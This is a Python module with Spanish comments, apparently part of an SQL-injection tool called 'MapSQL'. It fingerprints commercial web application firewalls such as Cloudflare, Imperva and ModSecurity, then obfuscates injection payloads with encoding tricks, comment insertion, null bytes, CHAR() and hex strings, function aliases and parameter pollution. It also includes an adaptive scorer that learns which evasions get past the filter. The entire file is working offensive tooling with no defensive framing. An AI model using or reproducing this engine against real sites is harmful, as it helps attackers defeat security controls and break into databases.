"""
MapSQL - WAF Bypass Automation Engine
Evasión inteligente de firewalls de aplicaciones web
"""

import random
import base64
import urllib.parse
from typing import List, Dict, Callable
import re
import time

class WAFBypassEngine:
    """Motor de evasión de WAF con múltiples técnicas"""
    
    def __init__(self):
        self.bypass_techniques = []
        self._register_techniques()
        self.waf_signatures = self._load_waf_signatures()
        self.detected_waf = None
        
    def _register_techniques(self):
        """Registra todas las técnicas de bypass disponibles"""
        self.bypass_techniques = [
            self._case_variation,
            self._url_encoding,
            self._double_url_encoding,
            self._comment_insertion,
            self._whitespace_variation,
            self._null_byte_injection,
            self._line_comment,
            self._function_obfuscation,
            self._hex_encoding,
            self._char_encoding,
            self._sql_hpp,
            self._json_escape,
            self._unicode_escape,
            self._inline_comment,
            self._random_parameter_name,
            self._http_parameter_pollution
        ]
    
    def _load_waf_signatures(self) -> Dict:
        """Firmas conocidas de WAFs para detección"""
        return {
            'Cloudflare': [r'cf-ray', r'cloudflare', r'__cfduid'],
            'AWS WAF': [r'awselb', r'x-amzn-RequestId'],
            'ModSecurity': [r'Mod_Security', r'NOYB'],
            'F5 BIG-IP': [r'X-F5', r'BIGipServer'],
            'Imperva': [r'incap_ses', r'visid_incap'],
            'Sucuri': [r'X-Sucuri', r'sucuri/cloudproxy'],
            'Fortinet': [r'FortiWeb', r'FORTIWAFSID'],
            'Barracuda': [r'barra_counter', r'Barracuda']
        }
    
    def detect_waf(self, response_headers: Dict, response_text: str) -> str:
        """Detecta qué WAF está protegiendo el objetivo"""
        for waf_name, signatures in self.waf_signatures.items():
            # Verificar en headers
            for header, value in response_headers.items():
                for sig in signatures:
                    if sig.lower() in header.lower() or sig.lower() in str(value).lower():
                        self.detected_waf = waf_name
                        return waf_name
            
            # Verificar en texto de respuesta
            for sig in signatures:
                if sig.lower() in response_text.lower():
                    self.detected_waf = waf_name
                    return waf_name
        
        return None
    
    def apply_bypass(self, payload: str, technique_name: str = None) -> str:
        """Aplica una técnica de bypass específica o aleatoria"""
        if technique_name:
            for technique in self.bypass_techniques:
                if technique.__name__ == f"_{technique_name}":
                    return technique(payload)
        
        # Seleccionar técnica aleatoria
        technique = random.choice(self.bypass_techniques)
        return technique(payload)
    
    def apply_all_bypasses(self, payload: str) -> List[str]:
        """Genera múltiples variantes del payload con diferentes bypasses"""
        variants = []
        for technique in self.bypass_techniques:
            try:
                variant = technique(payload)
                variants.append(variant)
            except:
                continue
        return list(set(variants))  # Eliminar duplicados
    
    def _case_variation(self, payload: str) -> str:
        """Variación de mayúsculas/minúsculas"""
        result = []
        for char in payload:
            if char.isalpha() and random.choice([True, False]):
                result.append(char.upper() if random.choice([True, False]) else char.lower())
            else:
                result.append(char)
        return ''.join(result)
    
    def _url_encoding(self, payload: str) -> str:
        """Codificación URL de caracteres específicos"""
        chars_to_encode = ["'", '"', ' ', '=', '(', ')', ';', '--']
        result = []
        for char in payload:
            if char in chars_to_encode and random.random() > 0.5:
                result.append(urllib.parse.quote(char))
            else:
                result.append(char)
        return ''.join(result)
    
    def _double_url_encoding(self, payload: str) -> str:
        """Doble codificación URL"""
        first_pass = urllib.parse.quote(payload)
        return urllib.parse.quote(first_pass)
    
    def _comment_insertion(self, payload: str) -> str:
        """Inserta comentarios inline para romper firmas"""
        sql_keywords = ['SELECT', 'UNION', 'WHERE', 'AND', 'OR', 'FROM', 'INSERT', 'UPDATE', 'DELETE']
        result = payload
        for keyword in sql_keywords:
            if keyword in result.upper():
                # Insertar comentario aleatorio
                comment = f"/**/{random.choice(['', '/*!', '/*!50000'])}"
                result = result.replace(keyword, f"{keyword}{comment}")
        return result
    
    def _whitespace_variation(self, payload: str) -> str:
        """Reemplaza espacios con alternativas"""
        alternatives = ['/**/', '%0a', '%0d', '%09', '%20', '/*!*/', '+']
        result = payload
        for i in range(len(result) - 1):
            if result[i] == ' ':
                replacement = random.choice(alternatives)
                result = result[:i] + replacement + result[i+1:]
        return result
    
    def _null_byte_injection(self, payload: str) -> str:
        """Inyección de null byte (%00)"""
        # Colocar null bytes antes de palabras clave
        sql_keywords = ['SELECT', 'UNION', 'FROM', 'WHERE']
        result = payload
        for keyword in sql_keywords:
            if keyword in result.upper():
                result = result.replace(keyword, f"%00{keyword}")
        return result
    
    def _line_comment(self, payload: str) -> str:
        """Comentarios de línea para ignorar el resto"""
        if '--' not in payload:
            payload += ' --'
        return payload
    
    def _function_obfuscation(self, payload: str) -> str:
        """Ofusca funciones SQL (ej: VERSION() -> @@VERSION)"""
        obfuscations = {
            'VERSION()': ['@@VERSION', 'VERSION()', '/*!50000VERSION*/()'],
            'DATABASE()': ['DATABASE()', 'SCHEMA()', 'DB_NAME()'],
            'USER()': ['USER()', 'CURRENT_USER()', 'SYSTEM_USER()'],
            'SLEEP(': ['SLEEP(', 'BENCHMARK(', '/*!50000SLEEP*/(']
        }
        
        result = payload
        for func, alternatives in obfuscations.items():
            if func.upper() in result.upper():
                result = result.replace(func, random.choice(alternatives))
        return result
    
    def _hex_encoding(self, payload: str) -> str:
        """Codificación hexadecimal de strings"""
        # Extraer strings entre comillas
        pattern = r"'([^']*)'"
        matches = re.findall(pattern, payload)
        
        result = payload
        for match in matches:
            hex_string = '0x' + ''.join(format(ord(c), 'x') for c in match)
            result = result.replace(f"'{match}'", hex_string)
        
        return result
    
    def _char_encoding(self, payload: str) -> str:
        """Usa función CHAR() para construir strings"""
        # Reemplazar strings con CHAR()
        pattern = r"'([^']*)'"
        matches = re.findall(pattern, payload)
        
        result = payload
        for match in matches:
            char_construct = 'CHAR(' + ','.join(str(ord(c)) for c in match) + ')'
            result = result.replace(f"'{match}'", char_construct)
        
        return result
    
    def _sql_hpp(self, payload: str) -> str:
        """HTTP Parameter Pollution para SQL"""
        # Duplicar el parámetro con el mismo valor
        return f"{payload}&{random.choice(['id', 'page', 'user'])}={payload.split('=')[-1] if '=' in payload else payload}"
    
    def _json_escape(self, payload: str) -> str:
        """Escaping para JSON"""
        return payload.replace("'", "\\'").replace('"', '\\"')
    
    def _unicode_escape(self, payload: str) -> str:
        """Escaping Unicode"""
        return payload.encode('unicode_escape').decode('utf-8')
    
    def _inline_comment(self, payload: str) -> str:
        """Comentarios inline aleatorios"""
        random_comment = f"/*!{random.randint(10000, 99999)}*/"
        return f"{random_comment}{payload}{random_comment}"
    
    def _random_parameter_name(self, payload: str) -> str:
        """Cambia nombres de parámetros aleatoriamente"""
        if '=' in payload:
            param, value = payload.split('=', 1)
            new_param = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(random.randint(3, 10)))
            return f"{new_param}={value}"
        return payload
    
    def _http_parameter_pollution(self, payload: str) -> str:
        """HTTP Parameter Pollution con múltiples valores"""
        if '=' in payload:
            param, value = payload.split('=', 1)
            return f"{param}={value}&{param}={value}"
        return payload


class AdaptiveBypasser:
    """Bypass adaptativo que aprende qué técnicas funcionan"""
    
    def __init__(self):
        self.engine = WAFBypassEngine()
        self.technique_scores = {}
        self._initialize_scores()
        self.blocked_count = 0
        
    def _initialize_scores(self):
        """Inicializa puntuaciones para cada técnica"""
        for technique in self.engine.bypass_techniques:
            self.technique_scores[technique.__name__] = 100  # Score inicial
    
    def report_result(self, technique_name: str, success: bool):
        """Actualiza score basado en éxito/fracaso"""
        if technique_name in self.technique_scores:
            if success:
                self.technique_scores[technique_name] += 10
            else:
                self.technique_scores[technique_name] -= 5
                self.blocked_count += 1
        
        # Mantener scores en rango razonable
        for tech in self.technique_scores:
            self.technique_scores[tech] = max(0, min(200, self.technique_scores[tech]))
    
    def get_best_technique(self) -> str:
        """Obtiene la mejor técnica según puntuación"""
        if not self.technique_scores:
            return None
        
        best = max(self.technique_scores, key=self.technique_scores.get)
        # Probabilidad de explorar otras técnicas (20%)
        if random.random() < 0.2:
            return random.choice(list(self.technique_scores.keys()))
        
        return best
    
    def adaptive_bypass(self, original_payload: str) -> str:
        """Aplica bypass adaptativo basado en historial"""
        best_tech = self.get_best_technique()
        if best_tech:
            # Llamar a la técnica específica
            technique_func = getattr(self.engine, best_tech)
            return technique_func(original_payload)
        
        return self.engine.apply_bypass(original_payload)
